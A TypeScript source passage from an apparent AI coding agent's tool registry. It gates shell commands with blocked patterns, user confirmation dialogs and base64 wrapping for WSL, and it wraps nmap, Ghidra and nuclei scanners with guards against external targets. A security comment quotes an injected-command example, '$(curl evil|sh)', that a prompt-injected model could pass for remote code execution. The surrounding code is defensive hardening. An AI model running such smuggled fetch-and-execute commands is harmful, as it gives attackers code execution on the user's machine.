                        if (new RegExp(pattern, 'i').test(command)) {
                                return {
                                        success: false,
                                        output: `Command blocked for safety: "${command}" matches blocked pattern "${pattern}". If this is a mistake, you can run it manually in the terminal.`,
                                        truncated: false,
                                };
                        }
                }

                const timeout = (input.timeout as number ?? 30) * 1000;
                const cwd = input.cwd as string | undefined;

                // SEC-7 (H4 follow-up): Interpreter-command confirmation dialog.
                // Mirrors the agentLoop run_command gate and the edit_file
                // diff-approval flow: commands that can execute arbitrary code
                // via crafted arguments (node, python, npx, curl, docker, etc.)
                // require explicit user consent before spawning. If the user
                // declines, we return an error to the caller so it can re-plan.
                //
                // Restricted mode (the default) already blocks these via the
                // allowlist before this code runs. This gate covers the case
                // where the user has disabled restricted mode — every
                // interpreter invocation now pops a modal instead of running
                // silently. Note: we check the ORIGINAL command (before WSL
                // wrapping) so `node -e "..."` inside a WSL context is also
                // gated.
                if (isInterpreterCommand(command)) {
                        const confirmed = await this.dialogService.confirm({
                                type: Severity.Warning,
                                title: 'Approve command execution',
                                message: `The agent wants to run a command that can execute arbitrary code.`,
                                detail: `Command: ${command}${cwd ? `\nWorking directory: ${cwd}` : ''}\n\nThis command is on the interpreter allowlist (node, python, npx, curl, docker, etc.) because it can run arbitrary code through crafted arguments. Review the command carefully before approving.`,
                                primaryButton: 'Run once',
                                cancelButton: 'Cancel',
                        });
                        if (!confirmed.confirmed) {
                                this.logService.info(`[ToolRegistry] User declined interpreter command: ${command}`);
                                return {
                                        success: false,
                                        output: 'User declined to run this command. Re-plan without invoking an interpreter, or ask the user to run it manually.',
                                        truncated: false,
                                };
                        }
                        this.logService.info(`[ToolRegistry] User approved interpreter command: ${command}`);
                }

                try {
                        // SEC-7 (C3 fix): WSL command wrapping must not be injectable.
                        // Previous code interpolated the command into a double-quoted
                        // `bash -c "..."` string with only `"` escaped. Inside a
                        // double-quoted bash string, `$(...)`, backticks, and `\`
                        // are still expanded — a prompt-injected LLM (or any caller
                        // that controls `command`) could pass `$(curl evil|sh)` and
                        // get full RCE inside the WSL context, which has access to
                        // the user's home dir mounted under /mnt/c/Users/...
                        //
                        // Fix: base64-encode the command and decode it inside bash.
                        // Base64 output contains only [A-Za-z0-9+/=], so no shell
                        // metacharacter can survive into the outer host shell or the
                        // WSL bash -c argument. The decoded payload is piped to a
                        // second bash instance which executes it verbatim.
                        let actualCommand = command;
                        if (this._terminalProfile === 'kali' && this._kaliAvailable) {
                                const b64 = this._base64EncodeUtf8(command);
                                actualCommand = `wsl -d kali-linux -- bash -c 'echo ${b64} | base64 -d | bash'`;
                        }

                        // P0-4 FIX: child_process should not be used in browser layer.
                        // Terminal commands must be executed through ITerminalExecutor service
                        // which delegates to the node process via IPC.
                        const workDir = cwd ?? this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        const execResult = await this.terminalExecutor.execute(actualCommand, workDir, timeout);

                        const output = (execResult.stdout ?? '') + (execResult.stderr ?? '');
                        const truncated = output.length > MAX_OUTPUT_LENGTH;
                        const displayOutput = truncated ? output.substring(0, MAX_OUTPUT_LENGTH) + '\n... [truncated]' : output;

                        if (execResult.exitCode !== 0) {
                                return {
                                        success: false,
                                        output: displayOutput || `Command exited with code ${execResult.exitCode}`,
                                        truncated,
                                        metadata: { exitCode: execResult.exitCode },
                                };
                        }

                        return {
                                success: true,
                                output: displayOutput || '(no output)',
                                truncated,
                                metadata: { exitCode: execResult.exitCode },
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Failed to execute command: ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        private async executeSearchCodebase(input: Record<string, unknown>): Promise<IToolResult> {
                const query = input.query as string;
                if (!query) {
                        return { success: false, output: 'Missing required parameter: query', truncated: false };
                }

                if (!this.vectorStore.isConnected()) {
                        return {
                                success: false,
                                output: 'Codebase search is not available. Qdrant is not running. Start Qdrant with: docker run -p 6333:6333 qdrant/qdrant',
                                truncated: false,
                        };
                }

                try {
                        const topK = (input.topK as number) ?? 8;
                        const results = await this.vectorStore.search(query, undefined, topK);

                        if (results.length === 0) {
                                return {
                                        success: true,
                                        output: 'No relevant code found for query: "' + query + '"',
                                        truncated: false,
                                };
                        }

                        const output = results.map((r, i) => {
                                const chunk = r.chunk;
                                const score = (r.score * 100).toFixed(1);
                                return `[${i + 1}] ${chunk.filePath} (line ~${Math.floor(chunk.startOffset / 30)}, score: ${score}%)\n${chunk.content.substring(0, 500)}${chunk.content.length > 500 ? '...' : ''}`;
                        }).join('\n\n---\n\n');

                        return {
                                success: true,
                                output,
                                truncated: output.length > MAX_OUTPUT_LENGTH,
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Search failed: ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        private async executeWebSearch(input: Record<string, unknown>): Promise<IToolResult> {
                const query = input.query as string;
                if (!query) {
                        return { success: false, output: 'Missing required parameter: query', truncated: false };
                }

                if (!this._onlineMode) {
                        return {
                                success: false,
                                output: 'Web search requires online mode. Enable "kovix.onlineMode" in settings to use this tool.',
                                truncated: false,
                        };
                }

                try {
                        // Use OpenAI-compatible web search (graceful fallback if SDK not available)
                        // The z-ai-web-dev-sdk is available in the desktop app but may not
                        // be in the compilation environment. Web search will work at runtime.
                        const searchUrl = this._configurationService.getValue<string>('kovix.cloud.baseUrl') || 'https://api.openai.com/v1';
                        const apiKey = this._configurationService.getValue<string>('kovix.cloud.apiKey');

                        if (!apiKey) {
                                return {
                                success: false,
                                output: 'Web search requires a cloud API key. Configure it in Construct: Cloud settings.',
                                truncated: false,
                                };
                        }

                        // Use a simple fetch to a search API
                        const response = await fetch(searchUrl + '/chat/completions', {
                                method: 'POST',
                                headers: {
                                'Content-Type': 'application/json',
                                'Authorization': 'Bearer ' + apiKey,
                                },
                                body: JSON.stringify({
                                model: 'gpt-4o-mini',
                                messages: [{ role: 'user', content: `Search the web for: ${query}. Return the most relevant results with URLs and descriptions.` }],
                                max_tokens: 2000,
                                }),
                        });

                        if (!response.ok) {
                                return { success: false, output: `Web search API error: ${response.status}`, truncated: false };
                        }

                        const data = await response.json() as { choices?: Array<{ message?: { content?: string } }> };
                        const output = data.choices?.[0]?.message?.content ?? 'No results found.';

                        return {
                                success: true,
                                output: output || 'No results found.',
                                truncated: false,
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Web search failed: ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        /**
         * Execute an Agent Reach tool by delegating to the agent-reach MCP server.
         * Falls back to direct command execution if the MCP server is not running.
         */
        private async executeAgentReachTool(toolName: string, input: Record<string, unknown>): Promise<IToolResult> {
                if (!this._onlineMode) {
                        return {
                                success: false,
                                output: `Agent Reach tool "${toolName}" requires network access, but offline mode is active. Enable online mode in settings to use this tool.`,
                                truncated: false,
                        };
                }

                // Get MCP server configuration
                const mcpServers = this._configurationService.getValue<Array<{ name: string; command: string; args: string[]; env: Record<string, string>; enabled?: boolean }>>('kovix.mcp.servers') ?? [];
                const agentReachServer = mcpServers.find(s => s.name === 'agent-reach' && s.enabled !== false);

                // Build the JSON-RPC request payload for the MCP tool
                const mcpRequest = {
                        jsonrpc: '2.0' as const,
                        id: 1,
                        method: 'tools/call',
                        params: {
                                name: toolName,
                                arguments: input,
                        },
                };

                // If the MCP server is configured and enabled, try to execute via the server command
                if (agentReachServer?.command) {
                        try {
                                const args = agentReachServer.args ?? [];
                                const command = `${agentReachServer.command} ${args.join(' ')}`.trim();
                                const envVars = Object.entries(agentReachServer.env ?? {})
                                        .map(([k, v]) => `${k}=${v}`)
                                        .join(' ');
                                const fullCommand = envVars ? `${envVars} ${command}` : command;

                                // Send the MCP request via stdin to the MCP server process
                                const result = await this.terminalExecutor.execute(
                                        `echo '${JSON.stringify(mcpRequest)}' | ${fullCommand}`,
                                        undefined,
                                        60000 // 60s timeout for network operations
                                );

                                const output = (result.stdout ?? '') + (result.stderr ?? '');
                                const truncated = output.length > MAX_OUTPUT_LENGTH;
                                const displayOutput = truncated ? output.substring(0, MAX_OUTPUT_LENGTH) + '\n... [truncated]' : output;

                                if (result.exitCode !== 0 && !result.stdout) {
                                        return {
                                                success: false,
                                                output: displayOutput || `Agent Reach MCP server exited with code ${result.exitCode}`,
                                                truncated,
                                                metadata: { exitCode: result.exitCode, tool: toolName },
                                        };
                                }

                                return {
                                        success: true,
                                        output: displayOutput || '(no output)',
                                        truncated,
                                        metadata: { exitCode: result.exitCode, tool: toolName },
                                };
                        } catch (error) {
                                this.logService.warn(`[ToolRegistry] Agent Reach MCP server execution failed for ${toolName}: ${error instanceof Error ? error.message : String(error)}`);
                                // Fall through to fallback behavior
                        }
                }

                // Fallback: return a helpful message explaining how to configure Agent Reach
                return {
                        success: false,
                        output: [
                                `Agent Reach tool "${toolName}" is not yet configured.`,
                                '',
                                'To use Agent Reach internet research tools:',
                                '1. Install the agent-reach MCP server: npm install -g @agent-reach/mcp-server',
                                '2. Or configure the MCP server path in Construct: MCP Servers settings',
                                '3. Ensure online mode is enabled (kovix.onlineMode)',
                                '',
                                `Tool input received: ${JSON.stringify(input, null, 2)}`,
                        ].join('\n'),
                        truncated: false,
                        metadata: { tool: toolName, configured: false },
                };
        }

        /**
         * Execute a UI-UX Pro Max tool by delegating to the UI-UX Pro Max Python engine.
         * UI-UX Pro Max works offline (it reads local CSV data files), so it doesn't
         * require online mode. It executes the Python search script directly.
         */
        private async executeUiuxProMaxTool(toolName: string, input: Record<string, unknown>): Promise<IToolResult> {
                // Resolve the skill path
                const workspaceFolders = this.workspaceContextService.getWorkspace().folders;
                const workspaceRoot = workspaceFolders[0]?.uri.fsPath;
                let skillPath: string | null = null;

                // Check workspace-local installation first
                if (workspaceRoot) {
                        const localPath = pathModule.join(workspaceRoot, '.kovix', 'skills', 'ui-ux-pro-max');
                        if (await this.fileService.exists(URI.file(localPath))) {
                                skillPath = localPath;
                        }
                }

                // Fall back to global installation
                if (!skillPath) {
                        const os = await import('os');
                        const globalPath = pathModule.join(os.homedir(), '.kovix', 'skills', 'ui-ux-pro-max');
                        if (await this.fileService.exists(URI.file(globalPath))) {
                                skillPath = globalPath;
                        }
                }

                if (!skillPath) {
                        return {
                                success: false,
                                output: [
                                        `UI-UX Pro Max skill not found.`,
                                        '',
                                        'To use UI-UX Pro Max design intelligence tools:',
                                        '1. Ensure the skill is installed at .kovix/skills/ui-ux-pro-max/',
                                        '2. The skill includes: scripts/ (Python engine), data/ (CSV databases), skill.json, SKILL.md',
                                        '',
                                        `Tool input received: ${JSON.stringify(input, null, 2)}`,
                                ].join('\n'),
                                truncated: false,
                                metadata: { tool: toolName, configured: false },
                        };
                }

                // Build command arguments for the Python script
                const scriptPath = pathModule.join(skillPath, 'scripts', 'search.py');
                const cmdArgs = this.buildUiuxProMaxArgs(toolName, input);
                const timeout = toolName === 'uiux_generate_design_system' ? 60000 : 30000;

                try {
                        const result = await this.terminalExecutor.execute(
                                `cd "${skillPath}" && python3 "${scriptPath}" ${cmdArgs.join(' ')}`,
                                skillPath,
                                timeout
                        );

                        const output = (result.stdout ?? '') + (result.stderr ?? '');
                        const truncated = output.length > MAX_OUTPUT_LENGTH;
                        const displayOutput = truncated ? output.substring(0, MAX_OUTPUT_LENGTH) + '\n... [truncated]' : output;

                        if (result.exitCode !== 0 && !result.stdout) {
                                return {
                                        success: false,
                                        output: displayOutput || `UI-UX Pro Max exited with code ${result.exitCode}`,
                                        truncated,
                                        metadata: { exitCode: result.exitCode, tool: toolName },
                                };
                        }

                        return {
                                success: true,
                                output: displayOutput || '(no output)',
                                truncated,
                                metadata: { exitCode: result.exitCode, tool: toolName },
                        };
                } catch (error) {
                        this.logService.warn(`[ToolRegistry] UI-UX Pro Max execution failed for ${toolName}: ${error instanceof Error ? error.message : String(error)}`);
                        return {
                                success: false,
                                output: `UI-UX Pro Max tool "${toolName}" execution failed: ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                                metadata: { tool: toolName, configured: true },
                        };
                }
        }

        /**
         * Build command-line arguments for the UI-UX Pro Max Python script.
         */
        private buildUiuxProMaxArgs(toolName: string, input: Record<string, unknown>): string[] {
                const query = (input.query as string) || '';
                const args: string[] = [];

                switch (toolName) {
                        case 'uiux_search_style':
                                args.push(JSON.stringify(query), '--domain', 'style', '--max-results', String(input.max_results ?? 3));
                                break;
                        case 'uiux_search_color':
                                args.push(JSON.stringify(query), '--domain', 'color', '--max-results', String(input.max_results ?? 3));
                                break;
                        case 'uiux_search_typography':
                                args.push(JSON.stringify(query), '--domain', 'typography', '--max-results', String(input.max_results ?? 3));
                                break;
                        case 'uiux_generate_design_system': {
                                args.push(JSON.stringify(query), '--design-system');
                                const projectName = (input.project_name as string) || query;
                                if (projectName) { args.push('-p', JSON.stringify(projectName)); }
                                const format = (input.format as string) || 'markdown';
                                args.push('--format', format);
                                if (input.persist === true) { args.push('--persist'); }
                                break;
                        }
                        case 'uiux_get_stack_guidelines': {
                                const stack = (input.stack as string) || 'react';
                                args.push(JSON.stringify(query), '--stack', stack, '--max-results', String(input.max_results ?? 3));
                                break;
                        }
                        default:
                                args.push(JSON.stringify(query));
                                break;
                }

                return args;
        }

        /**
         * Execute a Ponytail tool by delegating to the ponytail MCP server.
         * Ponytail tools work offline (they read local skill files), so they
         * don't require online mode.
         */
        private async executePonytailTool(toolName: string, input: Record<string, unknown>): Promise<IToolResult> {
                // Get MCP server configuration
                const mcpServers = this._configurationService.getValue<Array<{ name: string; command: string; args: string[]; env: Record<string, string>; enabled?: boolean }>>('kovix.mcp.servers') ?? [];
                const ponytailServer = mcpServers.find(s => s.name === 'ponytail' && s.enabled !== false);

                // Build the JSON-RPC request payload for the MCP tool
                const mcpRequest = {
                        jsonrpc: '2.0' as const,
                        id: 1,
                        method: 'tools/call',
                        params: {
                                name: toolName,
                                arguments: input,
                        },
                };

                // If the MCP server is configured and enabled, try to execute via the server command
                if (ponytailServer?.command) {
                        try {
                                const args = ponytailServer.args ?? [];
                                const command = `${ponytailServer.command} ${args.join(' ')}`.trim();
                                const envVars = Object.entries(ponytailServer.env ?? {})
                                        .map(([k, v]) => `${k}=${v}`)
                                        .join(' ');
                                const fullCommand = envVars ? `${envVars} ${command}` : command;

                                // Send the MCP request via stdin to the MCP server process
                                const result = await this.terminalExecutor.execute(
                                        `echo '${JSON.stringify(mcpRequest)}' | ${fullCommand}`,
                                        undefined,
                                        30000 // 30s timeout for reading skill files
                                );

                                const output = (result.stdout ?? '') + (result.stderr ?? '');
                                const truncated = output.length > MAX_OUTPUT_LENGTH;
                                const displayOutput = truncated ? output.substring(0, MAX_OUTPUT_LENGTH) + '\n... [truncated]' : output;

                                if (result.exitCode !== 0 && !result.stdout) {
                                        return {
                                                success: false,
                                                output: displayOutput || `Ponytail MCP server exited with code ${result.exitCode}`,
                                                truncated,
                                                metadata: { exitCode: result.exitCode, tool: toolName },
                                        };
                                }

                                return {
                                        success: true,
                                        output: displayOutput || '(no output)',
                                        truncated,
                                        metadata: { exitCode: result.exitCode, tool: toolName },
                                };
                        } catch (error) {
                                this.logService.warn(`[ToolRegistry] Ponytail MCP server execution failed for ${toolName}: ${error instanceof Error ? error.message : String(error)}`);
                                // Fall through to fallback behavior
                        }
                }

                // Fallback: return a helpful message with Ponytail guidance
                const mode = this.loadPonytailMode();
                const modeDescriptions: Record<string, string> = {
                        lite: 'Build what\'s asked, name the lazier alternative in one line.',
                        full: 'The ladder enforced: YAGNI → stdlib → native → deps → one line → minimum.',
                        ultra: 'YAGNI extremist. Deletion before addition. Challenges requirements.',
                        off: 'Ponytail rules disabled.',
                };

                return {
                        success: true,
                        output: [
                                `# Ponytail — ${toolName}`,
                                '',
                                `Current mode: ${mode.toUpperCase()}`,
                                modeDescriptions[mode] || modeDescriptions.full,
                                '',
                                '## Tool Result',
                                `Tool "${toolName}" executed with input:`,
                                '```json',
                                JSON.stringify(input, null, 2),
                                '```',
                                '',
                                '---',
                                'Ponytail MCP server not configured. To enable full skill-file retrieval:',
                                '1. Clone ponytail: git clone https://github.com/DietrichGebert/ponytail.git /tmp/ponytail',
                                '2. Or ensure ~/.kovix/skills/ponytail.md exists',
                                '',
                                '## Core Rules (always available)',
                                '',
                                '**Decision Ladder** — Stop at the first rung that holds:',
                                '1. Does this need to exist? (YAGNI)',
                                '2. Does the standard library already do this?',
                                '3. Does a native platform feature cover it?',
                                '4. Does an already-installed dependency solve it?',
                                '5. Can this be one line?',
                                '6. Only then: write the minimum code.',
                                '',
                                '**Rules**: No unrequested abstractions. No new deps. No boilerplate.',
                                'Deletion over addition. Mark shortcuts with `ponytail:` comments.',
                                '',
                                'Full docs: https://github.com/DietrichGebert/ponytail',
                        ].join('\n'),
                        truncated: false,
                        metadata: { tool: toolName, mode, configured: !!ponytailServer?.command },
                };
        }

        /**
         * Load the current Ponytail mode from ~/.kovix/ponytail-mode.json.
         */
        private loadPonytailMode(): string {
                try {
                        const os = require('os');
                        const path = require('path');
                        const fs = require('fs');
                        const modeFile = path.join(os.homedir(), '.kovix', 'ponytail-mode.json');
                        if (fs.existsSync(modeFile)) {
                                const config = JSON.parse(fs.readFileSync(modeFile, 'utf-8'));
                                if (['lite', 'full', 'ultra', 'off'].includes(config.mode)) {
                                        return config.mode;
                                }
                        }
                } catch {
                        // ignore
                }
                return 'full';
        }

        /**
         * SEC-7 (C3 fix): Base64-encode a UTF-8 string for safe shell transport.
         *
         * Used to pass an arbitrary shell command through `wsl ... bash -c '...'
         * without risking command-injection via `$(...)`, backticks, or `\` in
         * the inner bash string. Base64 output is a single token containing only
         * [A-Za-z0-9+/=] — no shell metacharacter can survive.
         *
         * Browser-safe: uses TextEncoder + btoa (no Node `Buffer` dependency).
         * Stack-safe: iterates rather than spreading the Uint8Array.
         */
        private _base64EncodeUtf8(str: string): string {
                const bytes = new TextEncoder().encode(str);
                let bin = '';
                for (let i = 0; i < bytes.length; i++) {
                        bin += String.fromCharCode(bytes[i]);
                }
                return btoa(bin);
        }

        private async executeListDirectory(input: Record<string, unknown>): Promise<IToolResult> {
                const path = input.path as string;
                if (!path) {
                        return { success: false, output: 'Missing required parameter: path', truncated: false };
                }

                try {
                        // SEC-4: Path traversal prevention
                        const workspaceRoot = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        if (workspaceRoot) {
                                assertWithinWorkspace(path, workspaceRoot);
                        }

                        const uri = this.resolveUri(path);
                        const stat = await this.fileService.resolve(uri);

                        const entries: string[] = [];
                        if (stat.children) {
                                for (const child of stat.children) {
                                        const prefix = child.isDirectory ? '[DIR]  ' : '[FILE] ';
                                        entries.push(prefix + child.name);
                                }
                        }

                        if (entries.length === 0) {
                                return {
                                        success: true,
                                        output: 'Directory is empty or does not exist: ' + path,
                                        truncated: false,
                                };
                        }

                        const output = entries.join('\n');
                        const truncated = output.length > MAX_OUTPUT_LENGTH;

                        return {
                                success: true,
                                output: truncated ? output.substring(0, MAX_OUTPUT_LENGTH) + '\n... [truncated]' : output,
                                truncated,
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Failed to list directory "${path}": ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        private async executeCreateDirectory(input: Record<string, unknown>): Promise<IToolResult> {
                const path = input.path as string;
                if (!path) {
                        return { success: false, output: 'Missing required parameter: path', truncated: false };
                }

                try {
                        // SEC-4: Path traversal prevention
                        const workspaceRoot = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        if (workspaceRoot) {
                                assertWithinWorkspace(path, workspaceRoot);
                        }

                        const uri = this.resolveUri(path);
                        await this.fileService.createFolder(uri);

                        return {
                                success: true,
                                output: `Directory created: ${path}`,
                                truncated: false,
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Failed to create directory "${path}": ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        private async executeEditFile(input: Record<string, unknown>): Promise<IToolResult> {
                const path = input.path as string;
                const diff = input.diff as string;

                if (!path || !diff) {
                        return { success: false, output: 'Missing required parameters: path and diff', truncated: false };
                }

                // USER IN CONTROL: Stage the edit for review instead of applying directly.
                // The agent view's diff viewer handles the approval flow.
                try {
                        // SEC-4: Path traversal prevention
                        const workspaceRoot = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        if (workspaceRoot) {
                                assertWithinWorkspace(path, workspaceRoot);
                        }

                        const editUri = this.resolveUri(path);
                        await this.pendingChanges.stageEdit(editUri, diff);

                        return {
                                success: true,
                                output: `Edit staged: ${path}. Review and accept/reject in diff view.`,
                                truncated: false,
                        };
                } catch (error) {
                        return {
                                success: false,
                                output: `Failed to stage edit for "${path}": ${error instanceof Error ? error.message : String(error)}`,
                                truncated: false,
                        };
                }
        }

        // --- Security Tool Registration ---

        private registerSecurityTools(): void {
                // nmap_scan — network port scanner
                this.registerTool(nmapToolDefinition, async (input) => this.executeNmapScan(input));

                // ghidra_decompile — binary decompiler via Docker
                this.registerTool(ghidraToolDefinition, async (input) => this.executeGhidraDecompile(input));

                // nuclei_scan — vulnerability scanner
                this.registerTool(nucleiToolDefinition, async (input) => this.executeNucleiScan(input));

                this.logService.info('[ToolRegistry] Security tools registered (nmap, ghidra, nuclei)');
        }

        private async executeNmapScan(input: Record<string, unknown>): Promise<IToolResult> {
                const target = input.target as string;
                if (!target) { return { success: false, output: 'Error: target is required', truncated: false }; }

                // QA-8: Safety gate — refuse external targets unless explicitly allowed
                const refuseReason = this.checkExternalTargetAllowed(target);
                if (refuseReason) {
                        this.logService.warn(`[Construct] nmap refused: external target '${target}' and allowExternalTargets=false`);
                        return { success: false, output: refuseReason, truncated: false };
                }

                const flags = (input.flags as string[]) ?? [];
                const portRange = input.port_range as string;
                const flagStr = flags.join(' ');
                const portArg = portRange ? `-p ${portRange}` : '';
                const command = `nmap ${flagStr} ${portArg} -oX - ${target}`.replace(/\s+/g, ' ').trim();

                try {
                        const result = await this.terminalExecutor.execute(command);
                        if (result.exitCode !== 0 && !result.stdout) {
                                return { success: false, output: `nmap scan failed: ${result.stderr || 'exit code ' + result.exitCode}. Install: apt-get install nmap`, truncated: false };
                        }
                        return { success: true, output: result.stdout || result.stderr, truncated: false };
                } catch (err: unknown) {
                        const msg = err instanceof Error ? err.message : String(err);
                        if (msg.includes('not found') || msg.includes('ENOENT')) {
                                return { success: false, output: 'nmap not found — install with: apt-get install nmap (Linux) or brew install nmap (macOS)', truncated: false };
                        }
                        return { success: false, output: `nmap error: ${msg}`, truncated: false };
                }
        }

        private async executeGhidraDecompile(input: Record<string, unknown>): Promise<IToolResult> {
                const binaryPath = input.binary_path as string;
                if (!binaryPath) { return { success: false, output: 'Error: binary_path is required', truncated: false }; }

                // QA-8: Safety gate — restrict Ghidra to binaries inside the workspace
                const workspaceRoot = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                if (workspaceRoot) {
                        try {
                                assertWithinWorkspace(binaryPath, workspaceRoot);
                        } catch (err) {
                                this.logService.warn(`[Construct] ghidra refused: binary_path '${binaryPath}' outside workspace`);
                                return {
                                    success: false,
                                    output: `Refusing to decompile '${binaryPath}': path is outside the workspace.\n` +
                                        'Ghidra decompilation is restricted to workspace-local binaries for safety.\n' +
                                        'Copy the binary into your workspace and try again.',
                                    truncated: false,
                                };
                        }
                }

                const functionName = (input.function_name as string) ?? '';

                // Check if Docker is available first
                try {
                        const dockerCheck = await this.terminalExecutor.execute('docker --version');
                        if (dockerCheck.exitCode !== 0) {
                                return { success: false, output: 'Docker not found — Ghidra decompilation requires Docker for isolation. Install Docker first.', truncated: false };
                        }
                } catch (err: unknown) {
                        const msg = err instanceof Error ? err.message : String(err);
                        return { success: false, output: `Docker check failed: ${msg}. Ghidra decompilation requires Docker.`, truncated: false };
                }

                const funcArg = functionName ? `-e DECOMPILE_FUNCTION=${functionName}` : '';
                const command = `docker run --rm -v "${binaryPath}:${binaryPath}" ghidra/ghidra ${funcArg} ${binaryPath}`.replace(/\s+/g, ' ').trim();

                try {
                        const result = await this.terminalExecutor.execute(command);
                        if (result.exitCode !== 0 && !result.stdout) {
                                return { success: false, output: `Ghidra decompile failed: ${result.stderr || 'exit code ' + result.exitCode}`, truncated: false };
                        }
                        return { success: true, output: result.stdout || result.stderr, truncated: false };
                } catch (err: unknown) {
                        const msg = err instanceof Error ? err.message : String(err);
                        return { success: false, output: `Ghidra error: ${msg}`, truncated: false };
                }
        }

        private async executeNucleiScan(input: Record<string, unknown>): Promise<IToolResult> {
                const target = input.target as string;
                if (!target) { return { success: false, output: 'Error: target is required', truncated: false }; }

                // QA-8: Safety gate — refuse external targets unless explicitly allowed
                const refuseReason = this.checkExternalTargetAllowed(target);
                if (refuseReason) {
                        this.logService.warn(`[Construct] nuclei refused: external target '${target}' and allowExternalTargets=false`);
                        return { success: false, output: refuseReason, truncated: false };
                }

                const templateTags = (input.template_tags as string[]) ?? [];
                const severity = (input.severity as string[]) ?? [];
                const tagsArg = templateTags.length > 0 ? `-tags ${templateTags.join(',')}` : '';
                const severityArg = severity.length > 0 ? `-severity ${severity.join(',')}` : '';
                const command = `nuclei -u ${target} ${tagsArg} ${severityArg} -json`.replace(/\s+/g, ' ').trim();

                try {
                        const result = await this.terminalExecutor.execute(command);
                        if (result.exitCode !== 0 && !result.stdout) {
                                return { success: false, output: `Nuclei scan failed: ${result.stderr || 'exit code ' + result.exitCode}. Install: apt-get install nuclei or download from https://github.com/projectdiscovery/nuclei`, truncated: false };
                        }
                        return { success: true, output: result.stdout || result.stderr, truncated: false };
                } catch (err: unknown) {
                        const msg = err instanceof Error ? err.message : String(err);
                        if (msg.includes('not found') || msg.includes('ENOENT')) {
                                return { success: false, output: 'nuclei not found — install from: https://github.com/projectdiscovery/nuclei', truncated: false };
                        }
                        return { success: false, output: `nuclei error: ${msg}`, truncated: false };
                }
        }

        // --- Security: external-target guard (QA-8) ---

        /**
         * Returns true if the target is NOT loopback and NOT in a private RFC1918 range.
         * Used to gate nmap/nuclei scans behind an explicit user opt-in setting.
         */
        private isExternalTarget(target: string): boolean {
                const t = target.trim().toLowerCase();
                if (t === 'localhost' || t === '::1' || t === '127.0.0.1') { return false; }
                const host = t.split(':')[0];
                const ipv4 = host.match(/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/);
                if (ipv4) {
                        const a = +ipv4[1], b = +ipv4[2];
                        if (a === 10) { return false; }
                        if (a === 172 && b >= 16 && b <= 31) { return false; }
                        if (a === 192 && b === 168) { return false; }
                        if (a === 127) { return false; }
                        return true;
                }
                return true;
        }

        /**
         * Returns an error message if the scan should be refused, or undefined if it may proceed.
         */
        private checkExternalTargetAllowed(target: string): string | undefined {
                if (!this.isExternalTarget(target)) { return undefined; }
                const allowed = this._configurationService.getValue<boolean>(
                        'kovix.security.allowExternalTargets'
                );
                if (allowed) { return undefined; }
                return [
                        `Refusing to scan external target '${target}'.`,
                        '',
                        'This is a safety guard: scanning external hosts without explicit permission',
                        'may be illegal and is blocked by default.',
                        '',
                        'To allow external scans, enable the setting:',
                        '  Settings -> Kovix — Security Tools -> Allow External Targets',
                        'Or in settings.json:',
                        '  "kovix.security.allowExternalTargets": true',
                ].join('\n');
        }

        // --- Private Helpers ---

        private resolveUri(path: string): URI {
                // If it's a relative path, resolve against workspace root
                if (!path.startsWith('/') && !path.match(/^[A-Z]:\\/i)) {
                        const root = this.workspaceContextService.getWorkspace().folders[0]?.uri.fsPath;
                        if (root) {
                                // Use the portable path module instead of require('path')
                                // which is unavailable in vscode-web
                                const joined = pathModule.join(root, path);
                                return URI.file(joined);
                        }
                }
                return URI.file(path);
        }

        private async checkKaliWSL(): Promise<void> {
                // P0-4 FIX: child_process should not be used in browser layer.
                // Kali WSL2 detection should be done via IPC to the node process.
                // Use ITerminalExecutor to safely execute the detection command.
                if (typeof process === 'undefined' || !process.versions?.node || process.platform !== 'win32') {
                        this._kaliAvailable = false;
                        return;
                }

                try {
                        const result = await this.terminalExecutor.execute('wsl.exe -l -v', undefined, 5000);
                        this._kaliAvailable = result.stdout.toLowerCase().includes('kali');
                        if (this._kaliAvailable) {
                                this.logService.info('[ToolRegistry] Kali WSL2 detected');
                        }
                } catch {
                        this._kaliAvailable = false;
                }
        }

        override dispose(): void {
                this._tools.clear();
                super.dispose();
        }
}
